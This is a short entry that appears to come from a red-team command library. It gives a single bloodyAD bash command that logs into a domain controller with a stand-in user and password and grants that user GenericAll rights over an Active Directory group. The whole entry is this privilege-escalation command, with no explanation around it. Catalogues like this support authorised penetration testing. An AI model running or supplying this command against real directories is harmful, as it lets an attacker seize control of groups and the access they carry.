---
id: 46dd50c8-e612-416c-a8dd-af453bfe52cd
name: Set Generic All for devil_user1 to INTERESTING_GROUP
type: command
executor: bash
data: bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll
  devil_user1 cn=INTERESTING_GROUP,dc=corp
output: null
created_at: '2023-04-06T03:56:06.850668+00:00'
updated_at: '2023-04-10T20:36:10.633986+00:00'
---

# Set Generic All for devil_user1 to INTERESTING_GROUP

```bash
bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
```


